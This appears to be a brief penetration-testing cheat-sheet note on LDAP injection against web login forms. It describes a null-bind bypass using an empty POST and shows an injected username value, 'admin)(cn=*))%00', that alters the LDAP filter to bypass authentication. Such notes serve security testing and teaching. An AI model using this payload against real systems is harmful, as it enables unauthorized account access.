# LDAP injection

## LDAP authentication on webapps

### NULL bind authentication bypass

* Try to login removing username & password field \(empty post\)...

### Injection in user field

* Initial request :

```csharp
GET /?name=user&password=password HTTP/1.1
```

* Can be turned into:

```csharp
GET /?name=admin)(cn=*))%00&password=password HTTP/1.1
```



